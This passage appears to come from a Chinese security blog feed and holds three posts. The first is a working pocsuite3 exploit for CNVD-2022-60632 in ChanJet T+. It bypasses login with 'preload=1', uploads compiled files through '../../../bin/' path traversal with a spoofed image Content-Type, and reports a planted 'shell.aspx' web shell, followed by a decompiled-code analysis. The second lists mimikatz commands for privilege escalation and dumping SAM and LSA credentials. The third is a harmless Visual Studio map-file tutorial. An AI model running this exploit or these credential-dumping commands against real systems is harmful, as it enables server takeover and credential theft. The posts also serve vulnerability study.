class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> OrderedDict, OptString</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChanJetPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;0&#x27;</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">    version = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 默认为1</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC作者的大名</span></span><br><span class="line">    vulDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 漏洞公开的时间,不知道就写今天</span></span><br><span class="line">    createDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2022-09-23&#x27;</span>  <span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">    name = <span class="string">&#x27;畅捷通T+ 任意文件上传&#x27;</span>  <span class="comment"># PoC 名称</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">    appName = <span class="string">&#x27;畅捷通T+&#x27;</span>  <span class="comment"># 漏洞应用名称</span></span><br><span class="line">    appVersion = <span class="string">&#x27;&#x27;&#x27;畅捷通T+单机版&lt;=17.0且使用IIS10.0以下版本&#x27;&#x27;&#x27;</span>  <span class="comment"># 漏洞影响版本</span></span><br><span class="line">    vulType = VUL_TYPE.UPLOAD_FILES  <span class="comment"># 漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CNVD-2022-60632 畅捷通T+ 任意文件上传漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 漏洞简要描述</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]  <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line">    pocDesc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    category = POC_CATEGORY.EXPLOITS.REMOTE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        path = <span class="string">&quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        url = self.url + path</span><br><span class="line">        filename = os.listdir(<span class="string">&#x27;bin&#x27;</span>)</span><br><span class="line">        filename_compiled = filename[<span class="number">0</span>]</span><br><span class="line">        filename_dll = filename[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            files = &#123;<span class="string">&quot;File1&quot;</span>: (<span class="string">&quot;../../../bin/&quot;</span>+filename_compiled+<span class="string">&quot;&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;bin/&#x27;</span>+filename_compiled, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">            resq_0 = requests.post(url=url, headers=headers, files=files, timeout=<span class="number">1000</span>)</span><br><span class="line">            files = &#123;<span class="string">&quot;File1&quot;</span>: (<span class="string">&quot;../../../bin/&quot;</span>+filename_dll+<span class="string">&quot;&quot;</span>,<span class="built_in">open</span>(<span class="string">&#x27;bin/&#x27;</span>+filename_dll, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/jpeg&quot;</span>)&#125;</span><br><span class="line">            resq_1 = requests.post(url=url, headers=headers, files=files, timeout=<span class="number">1000</span>)</span><br><span class="line">            <span class="keyword">if</span> resq_0.status_code == <span class="number">200</span> <span class="keyword">and</span> resq_1.status_code == <span class="number">200</span>:</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;URL&#x27;</span>] = url</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;shell&#x27;</span>] = self.url + <span class="string">&#x27;/tplus/shell.aspx?preload=1&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_attack</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;target is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_shell</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;target is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">register_poc(ChanJetPOC)</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析内容参考了其他作者的内容，仅学习记录，供参考。</p><p>前提环境，请求的 Params 中 <code>preload</code> 设置为 <code>1</code> 的目的是为了跳过登录认证，这个参数在畅捷通未登录情况下不能少。</p><p>漏洞位置为 upload 相关接口。在畅捷通环境下查看相关文件：</p><ul><li>TPlusStd\WebSite\SM\SetupAccount\upload.aspx：预编译文件，无实际内容，查看相关编译文件</li><li>\TPlusStd\WebSite\bin\upload.aspx.9475d17f.compiled：upload 相关逻辑预编译文件，指明了产物及编译所需的文件，内容如下所示：<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508163306577.png" class="" title="image-20240508163306577"></li><li>查看编译产物 <code>App_Web_upload.aspx.9475d17f.dll</code>，通过 dnSpy 查看 dll 内容。<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508163613153.png" class="" title="image-20240508163613153"></li></ul><p>dnSpy 反编译的 <code>Page_Load</code> 函数内容如下所示：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.ReadResources();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;images/index.gif&quot;</span>;</span><br><span class="line"><span class="built_in">object</span> obj = <span class="keyword">this</span>.ViewState[<span class="string">&quot;fileName&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (obj != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = obj.ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.File1.PostedFile.ContentLength &gt; <span class="number">204800</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.PhotoTooLarge,</span><br><span class="line"><span class="string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>,</span><br><span class="line">text,</span><br><span class="line"><span class="string">&quot;&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/bmp&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/gif&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.PhotoTypeError,</span><br><span class="line"><span class="string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>,</span><br><span class="line">text,</span><br><span class="line"><span class="string">&quot;&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> fileName = <span class="keyword">this</span>.File1.PostedFile.FileName;</span><br><span class="line"><span class="built_in">string</span> text2 = fileName.Substring(fileName.LastIndexOf(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">this</span>.File1.PostedFile.SaveAs(<span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;.&quot;</span>) + <span class="string">&quot;\\images\\&quot;</span> + text2);</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">value</span> = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;.&quot;</span>) + <span class="string">&quot;\\images\\&quot;</span> + text2;</span><br><span class="line"><span class="keyword">this</span>.ViewState[<span class="string">&quot;fileName&quot;</span>] = <span class="string">&quot;images/&quot;</span> + text2;</span><br><span class="line"><span class="keyword">this</span>.Session[<span class="string">&quot;ImageName&quot;</span>] = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的大致逻辑就是检查参数的 Content-Type 和文件大小（小于 200 KB），检查通过的话函数会继续往下执行。在 接口请求时已经修改过上传文件的 Content-Type 了，并且文件的大小也符合条件。条件允许范围内，任意后缀文件都可以上传。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508165803074.png" class="" title="Postman修改 Content-Type 参数"><p>附加到畅捷通进程调试截图如下所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508165637602.png" class="" title="Page_Load 函数"><p>可以看到上图这里已经保存了上传的文件。</p><blockquote><p>补充：补充一下 <code>preload</code> 参数的校验逻辑</p><ol><li>找一下 App_Web_upload.aspx.9475d17f 依赖的dll<style>.dvmwupqtqgma{zoom:50%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170419783.png" class="dvmwupqtqgma" alt="image-20240508170419783"><style>.agjtcxvcjpcb{zoom:50%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170614728.png" class="agjtcxvcjpcb" alt="image-20240508170614728"></li><li>查找和登录鉴权相关的接口<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170855132.png" class="" title="image-20240508170855132"></li><li>判断条件如下所示，当 flag 或者是以下所示的请求路径时，才会走到最终的请求，否则会在当前这个函数（<code>Application_PreRequestHandlerExecute</code>）处理请求<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508171359323.png" class="" title="image-20240508171359323"></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：CNVD-2022-60632 畅捷通 T+ 任意文件上传漏洞&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>mimikatz</title>
    <link href="http://example.com/C_OpenSource/mimikatz/"/>
    <id>http://example.com/C_OpenSource/mimikatz/</id>
    <published>2024-05-06T16:00:00.000Z</published>
    <updated>2024-05-07T02:41:58.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：mimikatz 项目使用及解析</p></blockquote><span id="more"></span><h2 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a>lsadump</h2><h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 提权</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 读取<span class="title">sam</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看帮助手册</span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">lsadump</span>::</span></span><br><span class="line"><span class="function"><span class="title">ERROR</span> <span class="title">mimikatz_doLocal</span> ; &quot;(<span class="title">null</span>)&quot; <span class="title">command</span> <span class="title">of</span> &quot;<span class="title">lsadump</span>&quot; <span class="title">module</span> <span class="title">not</span> <span class="title">found</span> !</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Module</span> :        <span class="title">lsadump</span></span></span><br><span class="line"><span class="function"><span class="title">Full</span> <span class="title">name</span> :     <span class="title">LsaDump</span> <span class="title">module</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">             <span class="title">sam</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">SAM</span> <span class="title">entries</span> (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">         <span class="title">secrets</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">SECRETS</span> <span class="title">entries</span> (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">           <span class="title">cache</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">NL</span>$<span class="title">KM</span> <span class="title">then</span> <span class="title">MSCache</span>(<span class="title">v2</span>) (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">             <span class="title">lsa</span>  -  <span class="title">Ask</span> <span class="title">LSA</span> <span class="title">Server</span> <span class="title">to</span> <span class="title">retrieve</span> <span class="title">SAM</span>/<span class="title">AD</span> <span class="title">entries</span> (<span class="title">normal</span>, <span class="title">patch</span> <span class="title">on</span> <span class="title">the</span> <span class="title">fly</span> <span class="title">or</span> <span class="title">inject</span>)</span></span><br><span class="line"><span class="function">           <span class="title">trust</span>  -  <span class="title">Ask</span> <span class="title">LSA</span> <span class="title">Server</span> <span class="title">to</span> <span class="title">retrieve</span> <span class="title">Trust</span> <span class="title">Auth</span> <span class="title">Information</span> (<span class="title">normal</span> <span class="title">or</span> <span class="title">patch</span> <span class="title">on</span> <span class="title">the</span> <span class="title">fly</span>)</span></span><br><span class="line"><span class="function">      <span class="title">backupkeys</span></span></span><br><span class="line"><span class="function">          <span class="title">rpdata</span></span></span><br><span class="line"><span class="function">          <span class="title">dcsync</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">DC</span> <span class="title">to</span> <span class="title">synchronize</span> <span class="title">an</span> <span class="title">object</span></span></span><br><span class="line"><span class="function">        <span class="title">dcshadow</span>  -  <span class="title">They</span> <span class="title">told</span> <span class="title">me</span> <span class="title">I</span> <span class="title">could</span> <span class="title">be</span> <span class="title">anything</span> <span class="title">I</span> <span class="title">wanted</span>, <span class="title">so</span> <span class="title">I</span> <span class="title">became</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span></span></span><br><span class="line"><span class="function">         <span class="title">setntlm</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">server</span> <span class="title">to</span> <span class="title">set</span> <span class="title">a</span> <span class="title">new</span> <span class="title">password</span>/<span class="title">ntlm</span> <span class="title">for</span> <span class="title">one</span> <span class="title">user</span></span></span><br><span class="line"><span class="function">      <span class="title">changentlm</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">server</span> <span class="title">to</span> <span class="title">set</span> <span class="title">a</span> <span class="title">new</span> <span class="title">password</span>/<span class="title">ntlm</span> <span class="title">for</span> <span class="title">one</span> <span class="title">user</span></span></span><br><span class="line"><span class="function">         <span class="title">netsync</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">DC</span> <span class="title">to</span> <span class="title">send</span> <span class="title">current</span> <span class="title">and</span> <span class="title">previous</span> <span class="title">NTLM</span> <span class="title">hash</span> <span class="title">of</span> <span class="title">DC</span>/<span class="title">SRV</span>/<span class="title">WKS</span></span></span><br><span class="line"><span class="function">        <span class="title">packages</span></span></span><br><span class="line"><span class="function">             <span class="title">mbc</span></span></span><br><span class="line"><span class="function">       <span class="title">zerologon</span></span></span><br><span class="line"><span class="function">   <span class="title">postzerologon</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：mimikatz 项目使用及解析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="C_OpenSource" scheme="http://example.com/categories/C-OpenSource/"/>
    
    
    <category term="OpenSource" scheme="http://example.com/tags/OpenSource/"/>
    
    <category term="mimikatz" scheme="http://example.com/tags/mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>【Visual Studio】查看符号导入信息</title>
    <link href="http://example.com/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/"/>
    <id>http://example.com/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/</id>
    <published>2024-04-23T16:00:00.000Z</published>
    <updated>2024-04-29T06:44:36.001Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：通过 map 文件查看引入的函数都是从哪个文件导入的</p></blockquote><span id="more"></span><h2 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h2><p>两个项目引入了同样的 lib 文件，一个编译没问题，但是另外一个编译报错链接错误，遇到这样的问题你该怎么办？</p><blockquote><p>：可以使用编程成功工程的 map 文件查看函数是通过哪个 lib 被链接到目标文件的</p></blockquote><h2 id="0x02-配置生成-map"><a href="#0x02-配置生成-map" class="headerlink" title="0x02 配置生成 map"></a>0x02 配置生成 map</h2><p>步骤一：关闭增量链接</p><img src="/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/image-20240424164444699.png" class="" title="image-20240424164444699"><p>步骤二：开启生成映射文件并设置映射文件名</p><img src="/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/image-20240424164602943.png" class="" title="image-20240424164602943"><p>配置完成之后编译工程就能生成 map 文件了。</p><p>可以查看 map 文件查看导入函数的一些信息。</p><h2 id="0x03-map-分析示例"><a href="#0x03-map-分析示例" class="headerlink" title="0x03 map 分析示例"></a>0x03 map 分析示例</h2><p>一段 map 文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0001:00237500       _crc32@12                  10238500 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237520       _crc32_z@12                10238520 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237770       _crc32_combine@12          10238770 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237790       _get_crc_table@0           10238790 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00238470       _crc32_combine64@16        10239470 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00238490       _deflate@8                 10239490 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002394b0       _deflateEnd@4              1023a4b0 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002395c0       _deflateSetDictionary@12   1023a5c0 f   